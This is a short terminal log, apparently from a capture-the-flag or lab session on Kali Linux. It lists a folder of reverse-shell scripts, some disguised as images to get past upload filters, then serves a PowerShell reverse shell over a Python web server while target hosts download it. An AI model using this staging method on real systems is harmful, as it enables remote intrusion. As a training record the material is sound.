
```sh
┌──(kali㉿kali)-[~]
└─$ cd shells 
                                                                                                                              
┌──(kali㉿kali)-[~/shells]
└─$ ls -la
total 60
drwxr-xr-x  2 kali kali 4096 Mar 27 09:49 .
drwx------ 35 kali kali 4096 Mar 29 18:45 ..
-rw-r--r--  1 kali kali 5490 Feb 11 02:37 php-reverse-shell.php
-rw-r--r--  1 kali kali 5488 Feb 11 02:24 php-reverse-shell.png
-rw-r--r--  1 kali kali  462 Jan 25 19:43 revsh-old.ps1
-rw-r--r--  1 kali kali  560 Mar 15 16:07 revsh.groovy
-rw-r--r--  1 kali kali 3512 Mar  3 17:02 revsh.php
-rw-------  1 kali kali  442 Jan 25 19:45 revsh.ps1
-rw-r--r--  1 kali kali 3519 Mar 27 09:45 shell.gif.php
-rw-r--r--  1 kali kali 3517 Mar 27 09:49 shell.jpg
-rw-r--r--  1 kali kali 3517 Mar 27 09:45 shell.jpg.php
-rw-r--r--  1 kali kali 3512 Mar 21 15:44 shell.php5
-rw-r--r--  1 kali kali 3521 Mar 27 09:46 shell.png.php
                                                                                                                              
┌──(kali㉿kali)-[~/shells]
└─$ python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.98.67 - - [29/Mar/2024 19:09:45] "GET /revshk.ps1 HTTP/1.1" 200 -
10.10.98.67 - - [29/Mar/2024 19:55:51] "GET /revshk.ps1 HTTP/1.1" 200 -
^C
Keyboard interrupt received, exiting.
                                                                                                                              
┌──(kali㉿kali)-[~/shells]
└─$ python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.67.28 - - [29/Mar/2024 20:18:03] "GET /revshk.ps1 HTTP/1.1" 200 -
```
